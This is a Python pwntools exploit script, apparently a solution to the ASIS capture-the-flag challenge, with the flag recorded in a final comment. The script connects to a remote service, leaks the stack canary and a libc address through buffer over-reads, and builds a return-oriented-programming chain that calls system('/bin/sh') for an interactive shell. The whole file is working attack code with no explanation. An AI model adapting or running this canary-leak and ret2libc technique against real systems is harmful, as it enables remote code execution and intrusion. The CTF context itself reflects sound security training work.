#!/usr/bin/env python3

from pwn import *

HOST = "45.153.243.57"
PORT = 1337

context.binary = elf = ELF('./chall_patched', checksec = False)
libc = ELF('./libc.so.6', checksec = False)
# p = process(elf.path)
p = remote(HOST, PORT)

payload1 = b'x' * 0x49
p.sendlineafter(b'How much???\n', b'1000')
p.sendafter(b'ok... now send content\n', payload1)
p.recvuntil(payload1)
canary = u64(p.recv(7).rjust(8, b'\x00'))
log.info('canary = ' + hex(canary))

p.sendlineafter(b'wanna do it again?\n', b'1337')
payload2 = b'x' * 0x58
p.sendlineafter(b'How much???\n', b'1000')
p.sendafter(b'ok... now send content\n', payload2)
p.recvuntil(payload2)
libc_leaked = u64(p.recv(6).ljust(8, b'\x00'))
log.info('libc leaked = ' + hex(libc_leaked))

libc.address = libc_leaked + 0x30 - libc.symbols['__libc_start_main']
pop_rdi = 0x000000000002a3e5 + libc.address 
ret = 0x0000000000029cd6 + libc.address
binsh = next(libc.search(b'/bin/sh'))
system = libc.symbols['system']

payload3 = b'x' * 0x48 + p64(canary) + b'x' * 8 + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system)
p.sendlineafter(b'wanna do it again?\n', b'1337')
p.sendlineafter(b'How much???\n', b'1000')
p.sendafter(b'ok... now send content\n', payload3)
p.sendlineafter(b'wanna do it again?\n', b'1111')

p.interactive()

# ASIS{so_you_know_how_to_pwn?!!!!}